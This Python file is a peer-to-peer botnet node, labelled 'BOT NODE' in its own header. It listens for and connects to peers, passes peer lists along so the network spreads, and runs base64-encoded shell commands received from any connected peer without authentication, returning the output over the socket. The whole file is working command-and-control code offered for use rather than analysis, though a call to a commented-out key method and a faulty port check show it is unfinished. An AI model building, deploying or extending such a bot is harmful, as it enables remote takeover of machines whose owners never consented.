#!/usr/bin/env python3

#####################################
### BOT NODE - executing cmd      ###
###          - no input           ###
###          - ?????????          ###
###          - ?????????          ###
###          - ?????????          ###
###          - send connections   ###
###              list to each     ###
###              new node         ###
#####################################
#####################################


import sys
import socket
import select
import subprocess
import base64
import os

from time import strftime, localtime, sleep
from random import randint
from base64 import b64encode, b64decode
from dataclasses import dataclass


@dataclass(frozen=True)
class _Const:
    BUFFER_SIZE = 4096
    MAX_CONNECTIONS = 100
    TIME_FORMAT = "%Y-%m-%d %I:%M:%S %p"


class Node:

    def __init__(self, ip: str, port: int) -> None:
        self._socket = {
            "id": str(randint(10000000, 99999999)),
            "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            "ip": ip,
            "port": port,
            "type": "MASTER",
        }
        self._socket["socket"].setblocking(False)
        self._socket["socket"].setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._tcp_connections = [ self._socket ]
        self._INPUT, self._OUTPUT, self._EXCEPT = [], [], []
        self._EXIT_ON_CMD = False



    # def recreate_keypair(self, user: str):
    #     passphrase = "Always the same"
    #     d = f"cstmcrypt/RSA-keys/{user}"

    #     if os.path.exists(d):
    #         os.rmdir(d)

    #     self._socket["meta"]["rsa"] = rsa_encrypter(
    #         user=user,
    #         passphrase=passphrase
    #     )


    #
    #
    #
    def init_server(self, c: _Const) -> int:
        try:
            self._socket["socket"].bind((self._socket["ip"], self._socket["port"]))
            self._socket["socket"].listen(c.MAX_CONNECTIONS)
        except socket.error as e:
            print(f"socket error on socket.bind()/socket.listen(): {e.args[::-1]}")
            return 1
        except Exception as e:
            print(f"error on socket.bind()/socket.listen(): {e.args[::-1]}")
            return 1
        return 0


    #
    # connect to peer
    #
    def connect_to_node(self, ip: str, port: int) -> int:
        target = {
            "id": self._tcp_connections[i]["id"] \
                    for i in range(len(self._tcp_connections)) \
                    if ip == self._tcp_connections[i]["ip"] and port == self._tcp_connections[i]["port"]
        }

        if target:
            node_id = target["id"]
        else:
            #print(f"[!] unable to find node_id for OUT target: {target}")
            node_id = str(randint(10000000, 99999999))

        conn_socket = {
            "id": node_id,
            "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            "ip": ip,
            "port": int(port),
            "type": "OUT"
        }

        t = strftime("%Y-%m-%d %I:%M:%S %p", localtime())

        for node in range(len(self._tcp_connections)):
            if self._tcp_connections[node]["ip"] == conn_socket["ip"] and self._tcp_connections[node]["port"] == conn_socket["port"]:
                print(f"{t} :: node {conn_socket['ip']}:{conn_socket['port']} is already connected.")
                return 1
        
        try:
            conn_socket["socket"].connect((conn_socket["ip"], conn_socket["port"]))
        except socket.error as e:
            print(f"socket error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
            return 1
        except Exception as e:
            print(f"error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
            return 1

        self._tcp_connections.append(conn_socket)
        self.send_list(target=conn_socket["socket"])
        

        print(f"{t} :: connected >>> {conn_socket['ip']}:{conn_socket['port']}")
        return 0


    #
    # send peer list to target
    #
    def send_list(self, target: socket.socket) -> None:

        temp_list = []
        
        for i in range(len(self._tcp_connections)):
            ftd = {}
            for key, val in self._tcp_connections[i].items():
                if key == 'socket':
                    continue
                ftd[key] = val
            temp_list.append(ftd)

        # filter nodes => send only OUT & MASTER sockets
        temp_list[:] = (node for node in temp_list if node["type"] != "INC")

        # convert to string with newlines
        peerlist = "\r\n".join(f"{peer['ip']}:{peer['port']}" for peer in temp_list)
        
        b64out = "inc-conns:".encode() + b64encode(peerlist.encode())

        temp_list.clear()
        target.sendall(b64out)


    #
    # get connected clients
    #
    def conninfo(self) -> None:
        for node in range(len(self._tcp_connections)):
            print(f"{node} - {self._tcp_connections[node]['id']} - {self._tcp_connections[node]['type']} - {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}")


    #
    #
    #
    def is_socket_closed(self, s: socket.socket) -> bool:
        try:
            # read bytes without blocking and removing them from buffer (peek only)
            data = s.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
            if len(data) == 0:
                return True
        except ConnectionResetError:
            print("socket was closed for some other reason..")
            return True
        except BlockingIOError:
            print("socket is open and reading from it would block..")
            return False
        except socket.error as e:
            # 107 => "Transport endpoint is not connected" => socket normally closed
            if e.errno == 107:
                return True
            print(f"socket-closed check unexpected error: {e.args[::-1]}")
            return False
        return False


    #
    # accept incomming connection | append node to peer list | add socket to stream_input | send new peer list to input thread
    #
    def handle_inc_connection(self, stream_in: list, c = _Const) -> int:
        try:
            sock, addr = self._socket["socket"].accept()
            sock.setblocking(False)
        except socket.error as e:
            if self._EXIT_ON_CMD:
                return 1
            print(f"socket error on socket.accept(): {e.args[::-1]}")
            return -1
        except Exception as e:
            if self._EXIT_ON_CMD:
                return 1
            print(f"error on socket.accept(): {e.args[::-1]}")
            return -1
        
        target = {
            "id": self._tcp_connections[i]["id"] \
                    for i in range(len(self._tcp_connections)) \
                        if addr[0] == self._tcp_connections[i]["ip"]
        }

        if target:
            node_id = target["id"]
        else:
            print(f"[!] unable to find node_id for INC target: {target}")
            node_id = str(randint(10000000, 99999999))

        self._tcp_connections.append({
            "id": node_id,
            "socket": sock,
            "ip": addr[0],
            "port": int(addr[1]),
            "type": "INC"
        })

        stream_in.append(sock)


        t = strftime(c.TIME_FORMAT, localtime())
        print(f"{t} :: connected <<< {addr[0]}:{addr[1]}")
        return 0


    #
    # connect to all new peers in list | send new peer list to input thread
    #
    def loop_connect_nodes(self, peer_list: str) -> None:

        peer_list_arr = peer_list.split("\r\n")

        for node in peer_list_arr:

            if isinstance(node, int):
                print("skipping int?? - DEBUG: ", node)
                continue

            node = node.strip()

            ip = node[:(node.find(':'))]
            port = int(node[(node.find(':') +1):])

            already_connected = False
            # not connecting to self
            if ip == self._socket["ip"] \
            and port == self._socket["port"]:
                continue
            # not connecting to already connected
            for i in range(len(self._tcp_connections)):
                if self._tcp_connections[i]["ip"] == ip and self._tcp_connections[i]["port"] == port:
                    already_connected = True
                    break
            if already_connected:
                continue
            self.connect_to_node(ip, port)
        

    #
    # handle recv from stream_select
    #
    def handle_connections(self, c: _Const) -> int:

        stream_in = [ self._socket["socket"] ]
        select_timeout_sec = 3

        while True:
            try:
                self._INPUT, self._OUTPUT, self._EXCEPT = select.select(stream_in, [], [], select_timeout_sec)
            except select.error as e:
                if self._EXIT_ON_CMD:
                    return 1
                print(f"select error on select.socket-select(): {e.args[::-1]}")
                return -1
            except ValueError as e:
                print("ValueError: FD -1 -- node disconnected unexpectedly -- removing from input stream")
                for s in stream_in:
                    if s.fileno() == -1:
                        stream_in.remove(s)
                        continue
            except Exception as e:
                if self._EXIT_ON_CMD:
                    return 1
                print(f"error on select.socket-select(): {e.args[::-1]}")
                return -1

            for s in self._INPUT:
                # new connection
                if s == self._socket["socket"]:
                    inc_conn_res = self.handle_inc_connection(stream_in, c=c)
                    if inc_conn_res != 0:
                        return inc_conn_res
                    continue

                inc = {
                    "node": self._tcp_connections[node] \
                            for node in range(len(self._tcp_connections)) \
                                if self._tcp_connections[node]["socket"] == s
                }

                if not inc:
                    print(">>> node not found?")
                    return 0

                if self.is_socket_closed(s):
                    print(f"socket closed! removing..")
                    self.dc_node(ip=inc['node']['ip'], c=c)
                    continue

                try:
                    inc_data = s.recv(c.BUFFER_SIZE)
                except socket.error as e:
                    print(f"socket error on recv(): {e.args[::-1]}")
                    self.dc_node(ip=inc['node']['ip'], c=c)
                    continue

                if not inc_data:
                    print("empty packet!")
                    self.dc_node(ip=inc['node']['ip'], c=c)
                    continue

                if isinstance(inc_data, bytes):
                    inc_data = inc_data.decode().strip()

                if inc_data:
                    if inc_data == "exit:":
                        self.dc_node(ip=inc['node']['ip'], c=c)
                        break





                    elif inc_data == "key:":
                        self.send_public_key_to_server(s=inc['node']['socket'])
                        continue





                    elif inc_data[:10] == "inc-conns:":
                        try:
                            peerlist = b64decode(inc_data[10:]).decode()
                            if isinstance(peerlist, bytes):
                                peerlist = peerlist.decode()
                            self.loop_connect_nodes(peer_list=peerlist)
                            self.conninfo()
                            continue
                        except Exception as e:
                            print(f"error on base64-decode connection-list: {e.args[::-1]}")

                    elif inc_data[:7] == "inccmd:":
                        try:
                            cmd = b64decode(inc_data[7:]).decode()
                            if isinstance(cmd, bytes):
                                cmd = cmd.decode()
                            print(f">>> incomming command sequence [{cmd}]")
                            self.exec_cmd(cmd=cmd, ip=inc['node']['ip'], c=c)
                        except Exception as e:
                            print(f"error on base64-decode incoming-cmd: {e.args[::-1]}")
                        
                        continue
                
                    t = strftime(c.TIME_FORMAT, localtime())
                    print(f"{t} :: [{inc['node']['id']}]:[{inc['node']['ip']}:{inc['node']['port']}] :: {inc_data}")

        #return 0


    #
    #
    #
    # def send_public_key_to_server(self, s: socket.socket):
    #     with open(self._socket["meta"]["rsa"]._pub_path, 'r') as f:
    #         fcontents = f.readlines()
    #         _nn = fcontents[2].split(',')[-1].strip().encode('utf-8')
    #         stripped_key = ''.join(fcontents[4:-1]).encode('utf-8')

    #     crafted_out = base64.b64encode(
    #         b';;'.join([_nn, stripped_key])
    #     )

    #     # send public key
    #     s.send(crafted_out)
        
    #     print(f"Public key sent -- {base64.b64decode(crafted_out)}")
        


    #
    #
    #
    def exec_cmd(self, cmd: str, ip: str, c: _Const) -> int:
        target = {
            "node": self._tcp_connections[node] \
                    for node in range(len(self._tcp_connections)) \
                    if self._tcp_connections[node]["ip"] == ip and self._tcp_connections[node]["type"] == "OUT"
        }
        
        if not target:
            print(f"target {ip} with type \"OUT\" doesn't exist")
            return 1

        cmds = cmd.split(";")
        returned_outputs = []
        
        for cmd in cmds:
            if not cmd:
                continue

            full_cmd = cmd.strip().split(" ")
            print(f"executing command [{full_cmd}]")

            try:
                r = subprocess.check_output(full_cmd)
                returned_outputs.append(r)
            except Exception as e:
                print(f"error on subprocess.check_output(): {e.args[::-1]}")

        try:
            ret = "\n-----\n".join([str(r) for r in returned_outputs])
            b64ret = "inc-ret-cmd:".encode() + b64encode(ret.encode())

            target["node"]["socket"].send(b64ret)
            
        except socket.error as e:
            print(f"socket error on cmd-ret socket.send(): {e.args[::-1]}")
            self.dc_node(ip=target['node']['ip'], c=c)
            return 1
        except Exception as e:
            print(f"error on cmd-ret socket.send(): {e.args[::-1]}")
            self.dc_node(ip=target['node']['ip'], c=c)
            return 1
        
        print(f">>> command sequence executed and output sent back to node: {target['node']['ip']}:{target['node']['port']}")
        return 0



    #
    # disconnect both node sockets
    #
    def dc_node(self, ip: str, c: _Const) -> None:
        inc_type_port, out_type_port = (0, 0)
        operation_success=False
        # close "OUT" socket
        for node in range(len(self._tcp_connections)):
            if self._tcp_connections[node]["ip"] == ip:
                if self._tcp_connections[node]["type"] == "OUT":
                    out_type_port = int(self._tcp_connections[node]["port"])

                if self._tcp_connections[node]["ip"] == ip and \
                (out_type_port > 0 and self._tcp_connections[node]["port"] == out_type_port) and \
                self._tcp_connections[node]["type"] == "OUT":
                    self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], c=c)
                    break
        # close "INC" socket
        for node in range(len(self._tcp_connections)):
            if self._tcp_connections[node]["ip"] == ip:
                # get "INC" socket port
                if self._tcp_connections[node]["type"] == "INC":
                    inc_type_port = int(self._tcp_connections[node]["port"])

                if self._tcp_connections[node]["ip"] == ip and \
                (inc_type_port > 0 and self._tcp_connections[node]["port"] == inc_type_port) and \
                self._tcp_connections[node]["type"] == "INC":
                    self.close_socket(s=self._tcp_connections[node]["socket"], ssi=[], c=c)
                    operation_success=True
                    break

        if operation_success:
            print(f">>> sockets closed successfuly for ip [{ip}].")
        else:
            print(f">>> error! sockets not closed for ip [{ip}].")



    #
    # close socket | remove from lists | re-send new list to stream_in thread
    # ssi => stream-select-inputs list
    #
    def close_socket(self, s: socket.socket, ssi: list, c: _Const) -> None:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except socket.error as e:
            pass
        
        s.close()

        # exiting by request - stream-input as empty array
        if ssi:
            ssi.remove(s)
        for node in range(len(self._tcp_connections)):
            if self._tcp_connections[node]["socket"] == s:

                t = strftime(c.TIME_FORMAT, localtime())
                socket_direction_type = ">>>" if self._tcp_connections[node]['type'] == "OUT" else "<<<"

                print(f"{t} :: disconnected {socket_direction_type} {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}")

                del self._tcp_connections[node]
                break


    #
    # close master socket & clear connections list
    #
    def close_master_socket(self) -> None:
        connections = self._tcp_connections
        t = strftime("%Y-%m-%d %I:%M:%S %p", localtime())
        self.loop_close_all_sockets()
        self._socket["socket"].shutdown(socket.SHUT_RDWR)
        self._socket["socket"].close()
        print("disconnected all clients..\nmaster socket closed!")



    #
    #
    #
    def loop_close_all_sockets(self) -> None:

        inc_type_port, out_type_port = (0, 0)

        while len(self._tcp_connections) > 0:

            # always grab 1st element of the list sequentially
            tcp_conn = self._tcp_connections.pop(0)
            ip = tcp_conn["ip"]
            operation_success=False

            # close "OUT" socket
            for node in range(len(self._tcp_connections)):
                if self._tcp_connections[node]["ip"] == ip:
                    if self._tcp_connections[node]["type"] == "OUT":
                        out_type_port = int(self._tcp_connections[node]["port"])

                    if self._tcp_connections[node]["ip"] == ip \
                    and (out_type_port > 0 and self._tcp_connections[node]["port"] == out_type_port) \
                    and self._tcp_connections[node]["type"] == "OUT":
                        try:
                            self._tcp_connections[node]["socket"].shutdown(socket.SHUT_RDWR)
                        except socket.error as e:
                            pass
                        self._tcp_connections[node]["socket"].close()
                        del self._tcp_connections[node]
                        break

            # close "INC" socket
            for node in range(len(self._tcp_connections)):
                if self._tcp_connections[node]["ip"] == ip:
                    # get "INC" socket port
                    if self._tcp_connections[node]["type"] == "INC":
                        inc_type_port = int(self._tcp_connections[node]["port"])

                    if self._tcp_connections[node]["ip"] == ip \
                    and (inc_type_port > 0 and self._tcp_connections[node]["port"] == inc_type_port) \
                    and self._tcp_connections[node]["type"] == "INC":
                        try:
                            self._tcp_connections[node]["socket"].shutdown(socket.SHUT_RDWR)
                        except socket.error as e:
                            pass
                        self._tcp_connections[node]["socket"].close()
                        del self._tcp_connections[node]
                        operation_success=True
                        break

            if operation_success:
                print(f">>> sockets closed successfuly for ip [{ip}].")
                sleep(0.5)
            else:
                print(f">>> error! sockets not closed for ip [{ip}].")


#
#
# read file
def r_file(fpath: str) -> bytes:
    fcontents = b''
    try:
        print(f"PATH: {fpath}")
        with open(fpath, "rb") as f:
            fcontents += f.read()
    except Exception as e:
        print(f"error on file.read(): {e.args[::-1]}")
        return b''
    return fcontents



#
#
#
def validate_ip_port(ip: str, port: int) -> int:
    # validate ip
    try:
        socket.inet_aton(ip)
    except socket.error as e: 
        print(f"invalid ip address: {e.args[::-1]}")
        return 1
    # validate port
    if 0 < port > 65535:
        print("port number not in range.")
        return 1
    return 0



#
#
#
def main():
    _argc = len(sys.argv)
    # ip:port provided
    if _argc >= 2:
        host = sys.argv[1].split(':')

        if len(host) == 2:
            # specified host
            ip, port = (str(host[0]), int(host[1]))
        elif len(host) == 1:
            # default host
            ip, port = (str(socket.gethostbyname(socket.gethostname())), int(host[0]))
        else:
            print(f"invalid host (ip:port): {host}")
            exit(1)

        if validate_ip_port(ip, port) != 0:
            print(f"invalid host (ip:port): {host}")
            exit(1)

        # initial target provided
        if _argc == 3:
            rn_0 = sys.argv[2].split(':')
            ip_0, port_0 = (str(rn_0[0]), int(rn_0[1]))
        else:
            ip_0, port_0 = (None, None)

    # no args
    else:
        default_port = 45666
        ip_0, port_0 = (None, None)

        if _argc == 1:
            # assign default host ip & port
            ip, port = (str(socket.gethostbyname(socket.gethostname())), default_port)
            print(f"ip:port not provided >>> using default host ip with default port >>> {ip}:{port}")
        else:
            print("invalid arguments")
            exit(1)

    n = Node(ip, port)
    c = _Const()

    # init node as tcp server
    if n.init_server(c) != 0:
        print("[!] failed to initialize node as server")
        exit(1)

    print(f">>>\n>>> P2P BOT Node {ip}:{port}\n>>>")

    # make initial connection
    if ip_0 and port_0:
        if validate_ip_port(ip_0, port_0) == 0:
            print(f">>> connecting to node-0 [{ip_0}:{port_0}]")
            n.connect_to_node(ip=ip_0, port=port_0)

    while True:    
        ret = n.handle_connections(c=c)
        if ret != 0:
            print(">>> breaking handle connections loop")
            break

    if ret == 0:
        print(f"exited normally with [{ret}]")
        n.close_master_socket()
    elif ret == 1:
        print(f"exited by cmd with [{ret}]")
    else:
        print(f"exited with error [{ret}]")
    
    exit(ret)

if __name__ == '__main__':
    main()